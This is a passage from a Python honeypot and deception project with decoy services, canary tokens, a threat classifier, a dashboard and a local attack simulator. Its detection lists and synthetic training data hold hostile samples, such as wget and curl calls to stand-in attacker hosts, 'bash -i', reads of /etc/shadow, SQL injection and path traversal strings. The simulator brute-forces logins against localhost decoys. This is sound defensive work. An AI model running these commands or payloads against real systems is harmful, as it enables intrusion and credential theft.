        canary = bool(self.canaries and self.canaries.is_canary_credential(user, pwd))
        self.emit(addr, "auth_attempt",
                  {"username": user, "password": pwd, "canary": canary},
                  raw=f"telnet login {user}:{pwd}")
        conn.sendall(b"\r\nLogin incorrect\r\n\r\n")

    def _read_line(self, conn, limit=128):
        conn.settimeout(30)
        buf = b""
        try:
            while len(buf) < limit:
                byte = conn.recv(1)
                if not byte or byte in (b"\r", b"\n"):
                    break
                if byte[0] < 32 or byte[0] > 126:
                    continue
                buf += byte
        except (socket.timeout, OSError):
            pass
        return buf.decode("ascii", errors="ignore")
'''),

("decoys/mysql_decoy.py", r'''"""MySQL decoy: realistic handshake banner; logs every connection."""

import socket

from decoys.base_decoy import BaseDecoy


class MySQLDecoy(BaseDecoy):
    DECOY_NAME = "mysql"
    VERSION = b"8.0.32"

    def _handle(self, conn, addr):
        self.emit(addr, "connection",
                  {"note": "TCP connection to decoy MySQL service"})
        try:
            conn.sendall(self._greeting())
            conn.settimeout(5)
            data = conn.recv(512)
            if data:
                self.emit(addr, "connection",
                          {"note": "client handshake data",
                           "hex": data[:64].hex()},
                          raw=data[:64].hex())
        except (socket.timeout, OSError):
            pass

    def _greeting(self):
        salt = b"abcdef123456"
        payload = (b"\x0a" + self.VERSION + b"\x00"
                   + b"\x2a\x00\x00\x00"
                   + salt + b"\x00"
                   + b"\xff\xf7\x08\x02\x00"
                   + b"\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                   + b"mysql_native_password\x00")
        return len(payload).to_bytes(3, "little") + b"\x01" + payload
'''),

("tokens/__init__.py", ""),

("tokens/canary_manager.py", r'''"""Canary tokens: believable FAKE secrets. Using them anywhere is a
high-fidelity, near-zero-false-positive intrusion signal."""

import os


class CanaryManager:
    def __init__(self, config):
        cfg = config.get("canary_tokens", {})
        self.usernames = cfg.get("usernames", ["svc_backup", "db_admin", "keypack"])
        self.passwords = cfg.get("passwords",
                                 ["B4ckup#2023!x", "Pr0dSQL!key77", "keypack-9f2c-44de"])
        self.deploy_dir = cfg.get("deploy_dir", "deployed_tokens")
        self.pairs = list(zip(self.usernames, self.passwords))
        self._pair_set = set(self.pairs)

    def is_canary_credential(self, username, password):
        return (username, password) in self._pair_set

    def is_canary_username(self, username):
        return username in set(self.usernames)

    def env_file_content(self):
        u, p = self.pairs[1] if len(self.pairs) > 1 else ("db_admin", "changeme")
        return (
            "# Production environment configuration - INTERNAL ONLY\n"
            "FLASK_ENV=production\n"
            "DATABASE_URL=mysql://app_user:AppUser2023@10.20.30.40:3306/corp_db\n"
            f"DB_ADMIN_USER={u}\n"
            f"DB_ADMIN_PASSWORD={p}\n"
            "SECRET_KEY=9f86d081884c7d659a2feaa0c55ad015\n"
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
            "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        )

    def password_file_content(self):
        lines = ["# Legacy service accounts (keep private!)", ""]
        for u, p in self.pairs:
            lines.append(f"{u}:{p}")
        lines += ["", "# NOTE: usage of any account above is monitored."]
        return "\n".join(lines) + "\n"

    def deploy(self):
        os.makedirs(self.deploy_dir, exist_ok=True)
        with open(os.path.join(self.deploy_dir, ".env"), "w") as fh:
            fh.write(self.env_file_content())
        with open(os.path.join(self.deploy_dir, "backup_passwords.txt"), "w") as fh:
            fh.write(self.password_file_content())
        with open(os.path.join(self.deploy_dir, "README_FIRST.txt"), "w") as fh:
            fh.write(
                "These files are CANARY TOKENS generated by the AI Cyber Deception "
                "Engine.\nThey contain deliberately fake secrets. If anyone reads "
                "these files and\nthen tries the credentials, the engine raises a "
                "CRITICAL alert instantly.\n")
'''),

("ai/__init__.py", ""),

("ai/feature_extractor.py", r'''"""Converts raw decoy events into fixed-length numeric feature vectors.
The same code path is used at training and at inference time (no skew)."""

import math
from collections import Counter
from datetime import datetime
from urllib.parse import unquote_plus

DECOY_VOCAB = ["ssh", "http", "ftp", "telnet", "mysql"]
EVENT_TYPE_VOCAB = ["connection", "auth_attempt", "command",
                    "http_request", "http_login", "file_access"]

COMMON_USERNAMES = {"root", "admin", "administrator", "user", "test", "guest",
                    "ubuntu", "pi", "oracle", "postgres", "anonymous", "ftp"}

SQLI_PATTERNS = ["'", "%27", "--", " or ", "union select", "1=1",
                 "drop table", "insert into", "sleep(", "benchmark("]
TRAVERSAL_PATTERNS = ["../", "..\\", "/etc/passwd", "/etc/shadow",
                      "win.ini", "boot.ini", "%2e%2e"]
INTERESTING_CMDS = ["wget", "curl ", "chmod", "chown", "/etc/shadow",
                    "ifconfig", "crontab", "history", "nc -", "bash -i",
                    "python -c", "id_rsa", ".ssh"]

NUMERIC_FEATURES = ["payload_len", "payload_entropy", "has_sqli",
                    "has_traversal", "has_suspect_command",
                    "common_username", "hour_frac"]


def shannon_entropy(s):
    if not s:
        return 0.0
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in Counter(s).values())


def payload_text(event):
    """Flatten an event into one lowercase string (URL-decoded twice)."""
    parts = [str(event.get("raw", "") or "")]
    for k, v in (event.get("data") or {}).items():
        parts.append(f"{k}={v}")
    text = " ".join(parts).lower()
    text = unquote_plus(unquote_plus(text))
    return text


def extract_features(event):
    data = event.get("data") or {}
    text = payload_text(event)
    ts = event.get("timestamp", "") or ""
    try:
        hour = datetime.fromisoformat(ts.replace("Z", "+00:00")).hour
    except ValueError:
        hour = datetime.utcnow().hour
    return {
        "decoy": event.get("decoy", ""),
        "event_type": event.get("event_type", ""),
        "payload_len": min(len(text), 2000),
        "payload_entropy": round(shannon_entropy(text), 4),
        "has_sqli": int(any(p in text for p in SQLI_PATTERNS)),
        "has_traversal": int(any(p in text for p in TRAVERSAL_PATTERNS)),
        "has_suspect_command": int(any(c in text for c in INTERESTING_CMDS)),
        "common_username": int(str(data.get("username", "")).lower()
                               in COMMON_USERNAMES),
        "hour_frac": hour / 24.0,
    }


def feature_names():
    names = [f"decoy={d}" for d in DECOY_VOCAB]
    names += [f"event_type={e}" for e in EVENT_TYPE_VOCAB]
    names += NUMERIC_FEATURES
    return names


def vectorize(feat):
    vec = [1 if feat["decoy"] == d else 0 for d in DECOY_VOCAB]
    vec += [1 if feat["event_type"] == e else 0 for e in EVENT_TYPE_VOCAB]
    vec += [feat["payload_len"], feat["payload_entropy"], feat["has_sqli"],
            feat["has_traversal"], feat["has_suspect_command"],
            feat["common_username"], feat["hour_frac"]]
    return vec
'''),

("ai/data_generator.py", r'''"""Synthetic labelled training data: benign / suspicious / malicious."""

import random
import string
from datetime import datetime, timezone

BENIGN_PATHS = ["/", "/index.html", "/health", "/favicon.ico"]
BENIGN_UAS = ["kube-probe/1.25", "UptimeRobot/2.0", "Mozilla/5.0 Chrome/120.0"]
SUS_PATHS = ["/wp-admin", "/phpmyadmin", "/.git/config", "/xmlrpc.php",
             "/admin", "/login", "/manager/html"]
SUS_USERS = ["root", "admin", "administrator", "test", "guest",
             "ubuntu", "pi", "user", "ftp", "anonymous"]
WEAK_PWDS = ["123456", "password", "admin123", "toor", "raspberry", "1234"]

MAL_USERS = ["svc_backup", "db_admin", "deploy", "jenkins", "ansible"]
MAL_CMDS = ["wget http://evil.example/x.sh -O /tmp/x",
            "cat /etc/shadow", "chmod 777 /tmp/x", "crontab -e",
            "ifconfig", "history", "curl http://c2.example/beacon"]
MAL_SQLI = ["1' OR '1'='1", "admin'--",
            "1 UNION SELECT username,password FROM users--",
            "'; DROP TABLE users;--"]
MAL_TRAV = ["../../../../etc/passwd", "..\\..\\windows\\win.ini", "/etc/shadow"]

BENIGN_IPS = ["192.168.1.50", "10.0.0.99", "172.16.0.9"]
ATTACK_IPS = ["45.61.187.24", "91.240.118.6", "185.220.101.5",
              "103.75.190.11", "159.223.44.9"]


def _ts(hour=None):
    now = datetime.now(timezone.utc)
    h = hour if hour is not None else now.hour
    return now.replace(hour=h, minute=random.randint(0, 59),
                       second=random.randint(0, 59), microsecond=0) \
        .isoformat().replace("+00:00", "Z")


def _event(decoy, etype, data=None, raw="", hour=None, attacker=False):
    return {"timestamp": _ts(hour),
            "source_ip": random.choice(ATTACK_IPS if attacker else BENIGN_IPS),
            "source_port": random.randint(40000, 60000),
            "decoy": decoy, "event_type": etype,
            "data": data or {}, "raw": raw}


def _strong_pwd():
    return "".join(random.choices(string.ascii_letters + string.digits, k=14))


def _benign():
    kind = random.random()
    hour = random.randint(8, 18)
    if kind < 0.5:
        return _event(random.choice(["ssh", "http", "ftp", "telnet", "mysql"]),
                      "connection", {"note": "internal health check"},
                      hour=hour)
    path = random.choice(BENIGN_PATHS)
    return _event("http", "http_request",
                  {"path": path, "user_agent": random.choice(BENIGN_UAS)},
                  raw=f"GET {path}", hour=hour)


def _suspicious():
    hour = random.randint(0, 23)
    if random.random() < 0.55:
        u = random.choice(SUS_USERS)
        return _event(random.choice(["ssh", "telnet", "ftp"]), "auth_attempt",
                      {"username": u, "password": random.choice(WEAK_PWDS)},
                      raw=f"login {u}", hour=hour, attacker=True)
    path = random.choice(SUS_PATHS)
    return _event("http", "http_request", {"path": path},
                  raw=f"GET {path}", hour=hour, attacker=True)


def _malicious():
    hour = random.choice([0, 1, 2, 3, 4, 5, 22, 23])
    kind = random.random()
    if kind < 0.25:
        payload = random.choice(MAL_SQLI)
        return _event("http", "http_request", {"path": f"/admin?id={payload}"},
                      raw=f"GET /admin?id={payload}", hour=hour, attacker=True)
    if kind < 0.45:
        payload = random.choice(MAL_TRAV)
        return _event("http", "http_request", {"path": payload},
                      raw=f"GET {payload}", hour=hour, attacker=True)
    if kind < 0.65:
        u, p = random.choice(MAL_USERS), _strong_pwd()
        return _event(random.choice(["ssh", "telnet"]), "auth_attempt",
                      {"username": u, "password": p},
                      raw=f"login {u}", hour=hour, attacker=True)
    if kind < 0.85:
        cmd = random.choice(MAL_CMDS)
        return _event("ssh", "command", {"command": cmd}, raw=cmd,
                      hour=hour, attacker=True)
    u, p = random.choice(MAL_USERS), _strong_pwd()
    return _event("http", "http_login", {"username": u, "password": p},
                  raw=f"POST /admin {u}", hour=hour, attacker=True)


def generate_dataset(n_samples=6000, seed=42):
    random.seed(seed)
    n_benign = int(n_samples * 0.40)
    n_suspicious = int(n_samples * 0.35)
    n_malicious = n_samples - n_benign - n_suspicious

    pairs = [(_benign(), "benign") for _ in range(n_benign)]
    pairs += [(_suspicious(), "suspicious") for _ in range(n_suspicious)]
    pairs += [(_malicious(), "malicious") for _ in range(n_malicious)]
    random.shuffle(pairs)

    events = [p[0] for p in pairs]
    labels = [p[1] for p in pairs]
    return events, labels
'''),

("ai/model.py", r'''"""Random-Forest threat classifier wrapper (train/save/load/predict)."""

import os

import joblib


class ThreatClassifier:
    def __init__(self, model=None, classes=None, feature_names=None):
        self.model = model
        self.classes = classes or []
        self.feature_names = feature_names or []

    def train(self, X, y, n_estimators=200, seed=42):
        from sklearn.ensemble import RandomForestClassifier
        from sklearn.metrics import classification_report
        from sklearn.model_selection import train_test_split

        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=0.25, random_state=seed, stratify=y)
        clf = RandomForestClassifier(n_estimators=n_estimators,
                                     random_state=seed, n_jobs=-1)
        clf.fit(X_train, y_train)
        report = classification_report(y_test, clf.predict(X_test), digits=3)
        self.model = clf
        self.classes = [str(c) for c in clf.classes_]
        return report

    def predict(self, X):
        """Returns a list of (label, confidence) tuples."""
        results = []
        for row in self.model.predict_proba(X):
            idx = int(row.argmax())
            results.append((self.classes[idx], float(row[idx])))
        return results

    def save(self, path):
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        joblib.dump({"model": self.model, "classes": self.classes,
                     "feature_names": self.feature_names}, path)

    @classmethod
    def load(cls, path):
        if not os.path.exists(path):
            return None
        blob = joblib.load(path)
        return cls(blob["model"], blob["classes"], blob["feature_names"])
'''),

("ai/train.py", r'''"""Train the AI threat classification model."""

import os

from ai.data_generator import generate_dataset
from ai.feature_extractor import extract_features, feature_names, vectorize
from ai.model import ThreatClassifier


def train_model(config, n_samples=6000):
    model_path = config.get("model", {}).get("path", "models/threat_model.joblib")
    report_path = config.get("model", {}).get("report_path",
                                              "models/training_report.txt")

    print(f"[*] Generating {n_samples} synthetic labelled events ...")
    events, labels = generate_dataset(n_samples)

    print("[*] Extracting features ...")
    X = [vectorize(extract_features(e)) for e in events]

    clf = ThreatClassifier(feature_names=feature_names())
    print("[*] Training Random Forest classifier ...")
    report = clf.train(X, labels)
    print(report)

    clf.save(model_path)
    os.makedirs(os.path.dirname(report_path) or ".", exist_ok=True)
    with open(report_path, "w", encoding="utf-8") as fh:
        fh.write("AI Cyber Deception Engine - Model Training Report\n")
        fh.write("=" * 60 + "\n")
        fh.write(f"samples: {n_samples}\n")
        fh.write(f"features: {len(feature_names())}\n")
        fh.write("algorithm: sklearn RandomForestClassifier (200 trees)\n\n")
        fh.write(report)

    print(f"[+] Model saved to   {model_path}")
    print(f"[+] Report saved to  {report_path}")
    return clf


if __name__ == "__main__":
    import yaml
    with open("config/config.yaml", encoding="utf-8") as fh:
        train_model(yaml.safe_load(fh))
'''),

("alerts/__init__.py", ""),

("alerts/alert_manager.py", r'''"""AlertManager: console / log file / webhook alerts + SIMULATED blocking."""

import json
import os
from datetime import datetime, timezone

import requests


class AlertManager:
    def __init__(self, db, config):
        self.db = db
        notifier_cfg = config.get("notifier", {})
        self.console = notifier_cfg.get("console", True)
        self.log_file = notifier_cfg.get("log_file", "logs/alerts.log")
        self.webhook_url = notifier_cfg.get("webhook_url", "")
        self.auto_block_severity = config.get("engine", {}) \
            .get("auto_block_severity", 5)
        if self.log_file:
            os.makedirs(os.path.dirname(self.log_file) or ".", exist_ok=True)

    def raise_alert(self, event, event_id, verdict):
        now = datetime.now(timezone.utc).isoformat(timespec="seconds")
        blocked = 0
        if verdict["severity"] >= self.auto_block_severity:
            self.db.add_block(event["source_ip"], verdict["reason"])
            blocked = 1

        alert = {"timestamp": now, "event_id": event_id,
                 "source_ip": event["source_ip"], "decoy": event["decoy"],
                 "severity": verdict["severity"], "label": verdict["label"],
                 "reason": verdict["reason"], "score": verdict.get("score", 0.0),
                 "blocked": blocked}
        self.db.insert_alert(alert)

        if self.console:
            self._print(alert)
        if self.log_file:
            with open(self.log_file, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(alert) + "\n")
        if self.webhook_url:
            try:
                requests.post(self.webhook_url, json=alert, timeout=3)
            except requests.RequestException:
                pass
        return alert

    def _print(self, a):
        line = "=" * 64
        print(line)
        print(f" [!] ALERT  severity={a['severity']}  label={a['label'].upper()}")
        print(f" time   : {a['timestamp']}")
        print(f" source : {a['source_ip']}   decoy: {a['decoy']}")
        print(f" reason : {a['reason']}")
        if a["blocked"]:
            print(" [>>] Source IP added to SIMULATED blocklist")
        print(line)
'''),

("dashboard/__init__.py", ""),

("dashboard/app.py", r'''"""Flask dashboard: live events, alerts, stats, blocklist + an endpoint that
launches the safe attack simulator, STREAMING its console output live."""

import contextlib
import logging
import os
import threading

from flask import Flask, jsonify, render_template

from engine.database import Database

_demo_state = {"running": False, "log": [], "ports": {}}


class _LogStream:
    """stdout-like object: appends every printed line to the demo log
    IMMEDIATELY so the UI console updates in real time."""

    def write(self, text):
        for line in str(text).splitlines():
            if line.strip():
                _demo_state["log"].append(line)
        if len(_demo_state["log"]) > 500:
            del _demo_state["log"][:-500]
        return len(str(text))

    def flush(self):
        pass


def create_app(db_path="data/deception.db", config=None):
    template_dir = os.path.join(os.path.dirname(__file__), "templates")
    app = Flask(__name__, template_folder=template_dir)
    db = Database(db_path)
    config = config or {}
    _demo_state["ports"] = {
        name: cfg.get("port")
        for name, cfg in config.get("decoys", {}).items() if cfg.get("enabled")
    }

    @app.route("/")
    def index():
        return render_template("index.html")

    @app.route("/api/stats")
    def stats():
        return jsonify(db.get_stats())

    @app.route("/api/events")
    def events():
        return jsonify(db.get_events(60))

    @app.route("/api/alerts")
    def alerts():
        return jsonify(db.get_alerts(60))

    @app.route("/api/blocklist")
    def blocklist():
        return jsonify(db.get_blocklist())

    @app.route("/api/run-demo", methods=["POST"])
    def run_demo():
        if _demo_state["running"]:
            return jsonify({"status": "already_running"})
        _demo_state["running"] = True
        _demo_state["log"] = ["[*] Launching simulated attack campaign..."]

        def target():
            try:
                with contextlib.redirect_stdout(_LogStream()):
                    from simulate.attack_simulator import run_all
                    run_all("127.0.0.1", _demo_state["ports"])
                _demo_state["log"].append("[*] Campaign finished - see alerts above")
            except Exception as exc:
                _demo_state["log"].append(f"[!] Demo error: {exc}")
            finally:
                _demo_state["running"] = False

        threading.Thread(target=target, daemon=True, name="demo").start()
        return jsonify({"status": "started"})

    @app.route("/api/demo-log")
    def demo_log():
        return jsonify({"running": _demo_state["running"],
                        "log": _demo_state["log"][-60:]})

    return app


def run_dashboard(config):
    cfg = config.get("dashboard", {})
    app = create_app(config.get("database", {}).get("path", "data/deception.db"),
                     config=config)
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    app.run(host=cfg.get("host", "127.0.0.1"),
            port=int(cfg.get("port", 5000)),
            threaded=True, use_reloader=False)
'''),

("dashboard/templates/index.html", r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>AI Cyber Deception Engine</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background:#0b1220; color:#dbe4f0; font-family:'Segoe UI',Arial,sans-serif; padding:24px; }
  .toprow { display:flex; justify-content:space-between; align-items:center; gap:16px; flex-wrap:wrap; }
  h1 { font-size:22px; color:#4ade80; letter-spacing:.5px; }
  .live { display:inline-block; width:10px; height:10px; border-radius:50%; background:#4ade80; margin-right:6px; animation:pulse 1.5s infinite; }
  @keyframes pulse { 50% { opacity:.3; } }
  .sub { color:#7d8ca3; font-size:13px; margin:4px 0 20px; }
  .btn { background:#7f1d1d; color:#fff; border:1px solid #b91c1c; padding:10px 18px; border-radius:8px; font-size:14px; font-weight:700; cursor:pointer; }
  .btn:hover { background:#991b1b; }
  .btn:disabled { opacity:.45; cursor:wait; }
  .console { display:none; background:#050a14; border:1px solid #1e2c47; border-radius:10px; padding:12px;
             font-family:Consolas,monospace; font-size:12px; color:#7ee787; height:170px;
             overflow-y:auto; white-space:pre-wrap; margin-bottom:20px; }
  .cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:14px; margin-bottom:22px; }
  .card { background:#111a2c; border:1px solid #1e2c47; border-radius:10px; padding:16px; }
  .card .num { font-size:26px; font-weight:700; color:#fff; }
  .card .lbl { font-size:12px; color:#7d8ca3; margin-top:4px; text-transform:uppercase; letter-spacing:1px; }
  .card.red .num { color:#f87171; } .card.orange .num { color:#fbbf24; } .card.blue .num { color:#60a5fa; }
  h2 { font-size:15px; color:#9fb3d1; margin:18px 0 8px; text-transform:uppercase; letter-spacing:1px; }
  table { width:100%; border-collapse:collapse; background:#111a2c; border-radius:10px; overflow:hidden; font-size:13px; }
  th { background:#16213a; text-align:left; padding:10px 12px; color:#8aa0c2; font-weight:600; }
  td { padding:8px 12px; border-top:1px solid #1a2742; color:#c7d3e8; }
  tr:hover td { background:#15203a; }
  .badge { padding:2px 8px; border-radius:20px; font-size:11px; font-weight:700; }
  .sev3 { background:#3a2c10; color:#fbbf24; } .sev4 { background:#3a1d10; color:#fb923c; } .sev5 { background:#3a1016; color:#f87171; }
  .chip { display:inline-block; background:#3a1016; color:#f87171; border:1px solid #57182a; padding:2px 10px; border-radius:14px; margin:2px; font-size:12px; }
  .empty { color:#5b6b85; font-style:italic; padding:10px 12px; }
  footer { margin-top:26px; color:#54617a; font-size:12px; }
</style>
</head>
<body>
  <div class="toprow">
    <div>
      <h1><span class="live"></span>AI Cyber Deception Engine &mdash; Live Dashboard</h1>
      <div class="sub">Decoy services luring attackers &middot; AI classifying every interaction &middot; canary tokens trip silent alarms</div>
    </div>
    <button class="btn" id="demoBtn">&#9876; SIMULATE ATTACK</button>
  </div>

  <div class="console" id="demoConsole"></div>

  <div class="cards">
    <div class="card blue"><div class="num" id="sEvents">0</div><div class="lbl">Events captured</div></div>
    <div class="card"><div class="num" id="sAlerts">0</div><div class="lbl">Alerts raised</div></div>
    <div class="card red"><div class="num" id="sCrit">0</div><div class="lbl">High / critical</div></div>
    <div class="card orange"><div class="num" id="sBlock">0</div><div class="lbl">Blocked sources</div></div>
  </div>

  <h2>Active Alerts</h2>
  <div id="blocklist"></div>
  <table>
    <thead><tr><th>Time</th><th>Source</th><th>Decoy</th><th>Severity</th><th>Label</th><th>Reason</th></tr></thead>
    <tbody id="alerts"><tr><td colspan="6" class="empty">Press SIMULATE ATTACK to begin&hellip;</td></tr></tbody>
  </table>

  <h2>Recent Decoy Events</h2>
  <table>
    <thead><tr><th>Time</th><th>Source</th><th>Decoy</th><th>Type</th><th>Detail</th></tr></thead>
    <tbody id="events"><tr><td colspan="5" class="empty">No events yet.</td></tr></tbody>
  </table>

  <footer>Educational project &mdash; decoys are simulated services; auto-blocking is demonstration only.</footer>

<script>
function esc(s){const d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;}
function badge(sev){return '<span class="badge sev'+sev+'">SEV '+sev+'</span>';}
function detail(e){
  const d=e.data||{};let bits=[];
  for(const k of ['username','password','command','path','note']){if(d[k])bits.push(k+': '+d[k]);}
  if(!bits.length&&e.raw)bits.push(e.raw);
  return esc(bits.join('  ').slice(0,110));
}
const demoBtn=document.getElementById('demoBtn');
const demoConsole=document.getElementById('demoConsole');
let demoStarted=false;

demoBtn.addEventListener('click',async()=>{
  demoBtn.disabled=true;
  demoConsole.style.display='block';
  demoConsole.textContent='Launching simulated attack campaign...';
  try{
    const r=await fetch('/api/run-demo',{method:'POST'});
    if(!r.ok)throw new Error('server answered '+r.status);
    demoStarted=true;
  }catch(err){
    demoConsole.textContent='ERROR: could not start the demo ('+err.message+').\n\n'
      +'This usually means this window shows an OLD dashboard.\n'
      +'Fix: close ALL terminals and this window, then restart desktop_app.py.';
    demoBtn.disabled=false;
  }
});

setInterval(async()=>{
  try{
    const r=await fetch('/api/demo-log').then(x=>x.json());
    if(r.log&&r.log.length){
      demoConsole.style.display='block';
      demoConsole.textContent=r.log.join('\n');
      demoConsole.scrollTop=demoConsole.scrollHeight;
    }
    if(demoStarted&&!r.running){demoStarted=false;demoBtn.disabled=false;}
  }catch(e){}
},1000);

async function refresh(){
  try{
    const [st,al,ev,bl]=await Promise.all([
      fetch('/api/stats').then(r=>r.json()),
      fetch('/api/alerts').then(r=>r.json()),
      fetch('/api/events').then(r=>r.json()),
      fetch('/api/blocklist').then(r=>r.json())
    ]);
    sEvents.textContent=st.total_events; sAlerts.textContent=st.total_alerts;
    sCrit.textContent=st.critical_alerts; sBlock.textContent=st.blocked_ips;
    document.getElementById('alerts').innerHTML = al.length ? al.map(a=>
      '<tr><td>'+esc(a.timestamp)+'</td><td>'+esc(a.source_ip)+'</td><td>'+esc(a.decoy)+
      '</td><td>'+badge(a.severity)+'</td><td>'+esc(a.label)+'</td><td>'+esc(a.reason)+
      (a.blocked?' <b style="color:#f87171">[BLOCKED]</b>':'')+'</td></tr>').join('')
      : '<tr><td colspan="6" class="empty">No alerts yet.</td></tr>';
    document.getElementById('events').innerHTML = ev.length ? ev.slice(0,25).map(e=>
      '<tr><td>'+esc(e.timestamp)+'</td><td>'+esc(e.source_ip)+'</td><td>'+esc(e.decoy)+
      '</td><td>'+esc(e.event_type)+'</td><td>'+detail(e)+'</td></tr>').join('')
      : '<tr><td colspan="5" class="empty">No events yet.</td></tr>';
    document.getElementById('blocklist').innerHTML = bl.map(b=>
      '<span class="chip">&#9940; '+esc(b.ip)+'</span>').join('');
  }catch(err){ console.error(err); }
}
refresh(); setInterval(refresh, 3000);
</script>
</body>
</html>
'''),

("simulate/__init__.py", ""),

("simulate/attack_simulator.py", r'''"""SAFE, fully local simulated attack campaign used to demo the engine.
Opens normal connections only to the decoys running on localhost."""

import re
import socket
import time

import requests

try:
    import paramiko
except ImportError:
    paramiko = None


def _hr(title):
    print("=" * 62)
    print(f" {title}")
    print("=" * 62)


def _banner_grab(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            try:
                return s.recv(256)
            except socket.timeout:
                return b""
    except OSError as exc:
        return f"<error: {exc}>".encode()


def _read_canary_pair(path="deployed_tokens/backup_passwords.txt"):
    try:
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
    except OSError:
        return None
    m = re.search(r"^([\w\-]+):(\S+)$", text, re.M)
    return (m.group(1), m.group(2)) if m else None


def scenario_health_checks(target, ports):
    _hr("Scenario 0 - benign internal health checks (should NOT alert)")
    for name, port in ports.items():
        _banner_grab(target, port)
        print(f"    [health] checked {name} decoy on {target}:{port}")
        time.sleep(0.4)


def scenario_port_scan(target, ports):
    _hr("Scenario 1 - horizontal port scan / banner grabbing")
    for name, port in ports.items():
        data = _banner_grab(target, port)
        print(f"    [scan  ] {target}:{port:<5} ({name:<6}) -> {data[:48]!r}")
        time.sleep(0.2)


def scenario_telnet_brute(target, ports):
    port = ports.get("telnet")
    if not port:
        return
    _hr("Scenario 2 - brute-force login attempt against Telnet decoy")
    for u, p in [("root", "toor"), ("admin", "admin"),
                 ("admin", "123456"), ("pi", "raspberry")]:
        try:
            with socket.create_connection((target, port), timeout=5) as s:
                s.settimeout(5)
                s.recv(256)
                s.sendall(f"{u}\n".encode()); time.sleep(0.2); s.recv(64)
                s.sendall(f"{p}\n".encode()); time.sleep(0.2); s.recv(128)
            print(f"    [brute ] tried telnet {u}:{p}")
        except OSError as exc:
            print(f"    [brute ] telnet {u}:{p} -> error {exc}")
        time.sleep(0.4)


def scenario_ssh_brute_and_canary(target, ports):
    port = ports.get("ssh")
    if not port:
        return
    if paramiko is None:
        print("[!] paramiko not installed - skipping SSH scenario")
        return
    _hr("Scenario 3 - SSH brute force, then use of STOLEN CANARY credentials")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for u, p in [("root", "toor"), ("admin", "Password1")]:
        try:
            client.connect(target, port=port, username=u, password=p,
                           look_for_keys=False, allow_agent=False, timeout=8)
        except paramiko.AuthenticationException:
            print(f"    [brute ] ssh {u}:{p} -> rejected")
        except Exception as exc:
            print(f"    [brute ] ssh {u}:{p} -> error {exc}")
        time.sleep(0.3)

    pair = _read_canary_pair()
    if pair is None:
        print("    [!] canary file missing - restart the engine to replant tokens")
        return
    u, p = pair
    try:
        client.connect(target, port=port, username=u, password=p,
                       look_for_keys=False, allow_agent=False, timeout=8)
        chan = client.invoke_shell()
        time.sleep(0.5)
        for cmd in ["whoami", "cat /etc/shadow"]:
            chan.send(cmd + "\n")
            time.sleep(0.6)
        time.sleep(0.5)
        chan.close()
        client.close()
        print(f"    [canary] logged into SSH with canary creds ({u}) "
              f"and ran commands - CRITICAL alert expected")
    except Exception as exc:
        print(f"    [canary] error: {exc}")


def scenario_web_attacks(target, ports):
    port = ports.get("http")
    if not port:
        return
    base = f"http://{target}:{port}"
    _hr("Scenario 4 - web recon, canary file theft, SQL injection, traversal")
    for path in ["/", "/robots.txt", "/admin", "/.env", "/backup/passwords.txt"]:
        try:
            r = requests.get(base + path, timeout=5)
            print(f"    [web   ] GET {path:<26} -> {r.status_code} ({len(r.content)} bytes)")
        except requests.RequestException as exc:
            print(f"    [web   ] GET {path} -> error {exc}")
        time.sleep(0.3)
    try:
        r = requests.get(base + "/admin", params={"id": "1' OR '1'='1"}, timeout=5)
        print(f"    [sqli  ] GET /admin?id=1' OR '1'='1 -> {r.status_code}")
    except requests.RequestException as exc:
        print(f"    [sqli  ] error {exc}")
    time.sleep(0.3)
    try:
        with socket.create_connection((target, port), timeout=5) as s:
            s.sendall(b"GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\r\nHost: "
                      + target.encode() + b"\r\n\r\n")
            time.sleep(0.4)
            resp = s.recv(512)
        print("    [trav  ] GET /../../../etc/passwd ->",
              resp.split(b"\r\n")[0].decode(errors="ignore"))
    except OSError as exc:
        print(f"    [trav  ] error {exc}")

    pair = _read_canary_pair()
    if pair:
        u, p = pair
        try:
            r = requests.post(base + "/admin",
                              data={"username": u, "password": p}, timeout=5)
            print(f"    [canary] POST /admin with stolen DB creds -> {r.status_code}"
                  f" - CRITICAL alert expected")
        except requests.RequestException as exc:
            print(f"    [canary] error {exc}")


def run_all(target="127.0.0.1", ports=None):
    ports = ports or {}
    print(f"[*] Simulated attack campaign against {target} (safe, local, educational)")
    scenario_health_checks(target, ports)
    time.sleep(1)
    scenario_port_scan(target, ports)
    scenario_telnet_brute(target, ports)
    scenario_ssh_brute_and_canary(target, ports)
    scenario_web_attacks(target, ports)
    _hr("Campaign finished - see alerts on the dashboard")
'''),

("tests/test_features.py", r'''from ai.feature_extractor import (extract_features, feature_names,
                                  shannon_entropy, vectorize)


def test_entropy_zero_for_uniform_string():
    assert shannon_entropy("aaaa") == 0.0


def test_sqli_pattern_detected():
    event = {"timestamp": "2024-01-01T10:00:00Z", "source_ip": "1.2.3.4",
             "source_port": 5, "decoy": "http", "event_type": "http_request",
             "data": {"path": "/admin?id=1' OR '1'='1"},
             "raw": "GET /admin?id=1' OR '1'='1"}
    assert extract_features(event)["has_sqli"] == 1


def test_vector_length_matches_feature_names():
    event = {"timestamp": "2024-01-01T10:00:00Z", "source_ip": "1.2.3.4",
             "source_port": 5, "decoy": "ssh", "event_type": "auth_attempt",
             "data": {"username": "root"}, "raw": ""}
    assert len(vectorize(extract_features(event))) == len(feature_names())
'''),

("tests/test_rules.py", r'''from engine.rules import evaluate_rules
